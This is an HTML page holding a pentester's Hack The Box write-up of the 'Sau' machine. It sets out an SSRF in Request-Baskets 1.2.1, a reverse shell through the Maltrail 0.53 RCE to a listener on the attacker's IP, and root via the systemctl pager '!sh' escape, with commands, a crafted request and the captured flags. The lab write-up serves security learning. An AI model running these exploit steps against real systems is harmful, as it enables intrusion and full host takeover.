@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Sau</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/sau/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Linux">← All Linux write-ups</a>
+                    <h1 data-type="Sau" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Easy">Easy</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <blockquote>30 points<br>Linux<br>10.10.11.224</blockquote>
+
+<h2>Discovery</h2>
+
+<details>
+<summary>nmap</summary>
+<div class="inner">
+<p><code>sudo nmap -A -sV -sT -v -O -T4 -p0- 10.10.11.224</code></p><pre><code>PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
+|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
+
+80/tcp    filtered http
+8338/tcp  filtered unknown
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Fri, 29 Sep 2023 20:09:25 GMT
+|     Content-Length: 75
+|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 302 Found
+|     Content-Type: text/html; charset=utf-8
+|     Location: /web
+|     Date: Fri, 29 Sep 2023 20:08:59 GMT
+|     Content-Length: 27
+|     href="/web"&gt;Found&lt;/a&gt;.
+|   HTTPOptions:
+|     HTTP/1.0 200 OK
+|     Allow: GET, OPTIONS
+|     Date: Fri, 29 Sep 2023 20:08:59 GMT
+|_    Content-Length: 0
+55555/tcp open     unknown
+
+Running (JUST GUESSING): Fortinet embedded (87%)
+OS CPE: cpe:/h:fortinet:fortigate_100d
+Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+</div>
+</details>
+
+<details>
+<summary>webapp (Request-Baskets)</summary>
+<div class="inner">
+<figure><img src="../assets/images/htb/sau/01-untitled.png" alt=""></figure><p><strong>Version:</strong> 1.2.1</p><pre><code>GET /web HTTP/1.1
+Host: 10.10.11.224:55555</code></pre><pre><code>Powered by &lt;a href="https://github.com/darklynx/request-baskets"&gt;request-baskets&lt;/a&gt; |
+Version: 1.2.1</code></pre><figure><p><a href="https://www.cvedetails.com/cve/CVE-2023-27163/" target="_blank" rel="noopener noreferrer">CVE-2023-27163 · CVE Details</a></p></figure><p>→ has a known vulnerability</p>
+</div>
+</details>
+
+<h2>Request-Baskets SSRF</h2>
+
+<p><a href="https://github.com/entr0pie/CVE-2023-27163" target="_blank" rel="noopener noreferrer">https://github.com/entr0pie/CVE-2023-27163</a></p>
+
+<p><strong>Method 1:</strong></p>
+
+<p><code>./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/</code></p>
+
+<pre><code>Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
+
+&gt; Creating the "hravlo" proxy basket...
+&gt; Basket created!
+&gt; Accessing http://10.10.11.224:55555/hravlo now makes the server request to http://127.0.0.1:80/.
+./CVE-2023-27163.sh: line 43: jq: command not found
+&gt; Response body (Authorization): {"token":"-GVr0J1PZdfeEtzL1pxOT00W3t_RFTGbUvuikEHHGVhq"}→ Visit: http://10.10.11.224:55555/hravl</code></pre>
+
+<p><strong>Method 2:</strong></p>
+
+<p>Use the GUI to forward to the filtered port :80</p>
+
+<figure><img src="../assets/images/htb/sau/02-untitled-1.png" alt=""></figure>
+
+<details>
+<summary>Request in burp</summary>
+<div class="inner">
+<pre><code>PUT /api/baskets/picuk91 HTTP/1.1
+Host: 10.10.11.224:55555
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Authorization: 4QrCpAP4TwNuEE5OzSf4J0y8EvgvTDtMr4gg93eoEa78
+X-Requested-With: XMLHttpRequest
+Content-Length: 114
+Origin: http://10.10.11.224:55555
+Connection: close
+Referer: http://10.10.11.224:55555/web/picuk91
+
+{"forward_url":"http://127.0.0.1:80/","proxy_response":true,"insecure_tls":true,"expand_path":true,"capacity":200}</code></pre>
+</div>
+</details>
+
+<blockquote>Now when visiting <a href="http://10.10.11.224:55555/hravlo">http://10.10.11.224:55555/hravlo</a> we get the following page, the application running on port :80</blockquote>
+
+<figure><img src="../assets/images/htb/sau/03-untitled-2.png" alt=""></figure>
+
+<ul><li>Maltrail (v0.53)</li></ul>
+
+<h2>Maltrail RCE</h2>
+
+<figure><p><a href="https://www.exploit-db.com/exploits/51676" target="_blank" rel="noopener noreferrer">Maltrail v0.53 - Unauthenticated Remote Code Execution (RCE)</a> - webapps exploit for Python platform</p></figure>
+
+<ol><li>Start listener<p><code>nc -lvp 8000</code></p></li><li>run exploit
+
+<p><code>python3 rce.py 10.10.16.6 8000 http://10.10.11.224:55555/picuk9</code></p>
+
+<pre><code>Running exploit on http://10.10.11.224:55555/picuk91/login</code></pre>
+
+</li><li>Reverse shell established</li></ol>
+
+<figure><img src="../assets/images/htb/sau/04-untitled-3.png" alt=""></figure>
+
+<p>Found flag in <code>/home/puma/user.txt</code> → <mark class="highlight-teal" data-notion-highlight="teal"><strong>4bdbd41dd184235e609298696547cf5f</strong></mark></p>
+
+<h2>Priv escalation</h2>
+
+<p>linpeas:</p>
+
+<details>
+<summary>OS</summary>
+<div class="inner">
+<pre><code>Linux version 5.4.0-153-generic (buildd@bos03-amd64-008) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023
+Distributor ID: Ubuntu
+Description:    Ubuntu 20.04.6 LTS
+Release:        20.04
+Codename:       focal</code></pre>
+</div>
+</details>
+
+<details>
+<summary>sudo</summary>
+<div class="inner">
+<pre><code>╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
+Sudo version 1.8.</code></pre>
+</div>
+</details>
+
+<details>
+<summary>exploit suggestions</summary>
+<div class="inner">
+<pre><code>╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: probable
+   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: probable
+   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: less probable
+   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154</code></pre>
+</div>
+</details>
+
+<p>Check sudo apps:</p>
+
+<p><code>sudo -l</code></p>
+
+<pre><code>Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
+
+<figure><p><a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener noreferrer">systemctl | GTFOBins</a> - If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</p></figure>
+
+<pre><code>sudo systemctl status trail.service
+!sh</code></pre>
+
+<figure><img src="../assets/images/htb/sau/05-untitled-4.png" alt=""></figure>
+
+<p>Root flag → <mark class="highlight-teal" data-notion-highlight="teal"><strong>766dd11421587c97dba61df02e0f4417</strong></mark></p>
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
